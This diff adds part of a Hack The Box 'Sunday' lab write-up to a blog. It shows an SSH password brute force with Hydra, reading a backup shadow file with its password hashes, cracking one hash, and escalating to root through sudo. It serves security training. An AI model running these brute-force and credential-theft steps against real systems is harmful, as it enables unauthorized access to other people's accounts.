@@ -88,5 +88,118 @@ Finger is a program you can use to find information about computer users. It usu
 
 found a finger-userenum script on github, let's check for available users 
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e13dbdac-2305-4f1c-962f-ee532fc0169c)
+
+run the script, got 2 users `sunny` & `sammy`...
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Sunday/finger-user-enum]
+└─$ hydra -l sunny -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt 10.10.10.76 -s 22022 ssh
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-04 13:50:42
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 9999 login tries (l:1/p:9999), ~625 tries per task
+[DATA] attacking ssh://10.10.10.76:22022/
+[STATUS] 176.00 tries/min, 176 tries in 00:01h, 9823 to do in 00:56h, 16 active
+[STATUS] 152.00 tries/min, 456 tries in 00:03h, 9543 to do in 01:03h, 16 active
+[STATUS] 142.29 tries/min, 996 tries in 00:07h, 9003 to do in 01:04h, 16 active
+[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-04 14:01:43
+```
+bruteforcing ssh password for user `sunny` and boom we got the password.
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Sunday/finger-user-enum]
+└─$ ssh sunny@sunday.htb -p 22022
+The authenticity of host '[sunday.htb]:22022 ([10.10.10.76]:22022)' can't be established.
+ED25519 key fingerprint is SHA256:t3OPHhtGi4xT7FTt3pgi5hSIsfljwBsZAUOPVy8QyXc.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? ys
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '[sunday.htb]:22022' (ED25519) to the list of known hosts.
+(sunny@sunday.htb) Password: 
+Warning: at least 15 failed authentication attempts since last successful authentication.  The latest at Sun Jun 04 13:01 2023.
+Last login: Sun Jun  4 13:01:21 2023 from 10.10.14.16
+Oracle Corporation      SunOS 5.11      11.4    Aug 2018
+sunny@sunday:~$ id
+uid=101(sunny) gid=10(staff)
+sunny@sunday:~$ 
+```
+cool we are in ssh as user `sunny`. let's escalate privs.
+
+
+## Privilege Escalation
+
+```
+sunny@sunday:~$ cat .bash_history 
+su -                
+su -              
+cat /etc/resolv.conf  
+su -                  
+ps auxwww|grep overwrite
+su -                   
+sudo -l                                                                            
+sudo /root/troll                                                                   
+ls /backup      
+ls -l /backup
+cat /backup/shadow.backup
+sudo /root/troll
+sudo /root/troll
+su -
+sudo -l
+sudo /root/troll
+ps auxwww
+ps auxwww
+ps auxwww
+top
+top
+top
+ps auxwww|grep overwrite
+su -
+su -
+cat /etc/resolv.conf 
+ps auxwww|grep over
+sudo -l
+sudo /root/troll
+sudo /root/troll
+sudo /root/troll
+sudo /root/troll
+sunny@sunday:~$ cat cat /backup/shadow.backup
+cat: cannot open cat: No such file or directory
+mysql:NP:::::::
+openldap:*LK*::::::: 
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+```
+in user sunny dir, checking `.bash_history` file, we can see a backup shadow file, checking the content of the shadow fle we got to read user `sammy` password hash. let's crack the hash. hash crackd to be `cooldude!` as the password.
+
+```
+sunny@sunday:~$ su sammy
+Password: 
+Warning: 10 failed authentication attempts since last successful authentication.  The latest at Sun Jun 04 13:16 2023.
+sammy@sunday:~$ sudo -l
+User sammy may run the following commands on sunday:
+    (ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget
+sammy@sunday:~$ sudo su
+Password: 
+root@sunday:/home/sunny# cd
+root@sunday:~# 
+```
+su user `sammy` with th password found, and checking for sudo prive we can run sudo with all commands. sudo su gave us a root shell.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9e7726fb-fa18-44c4-9f77-269ac51e2d2f)
+
+and we are through. 😜
+
+
 
 
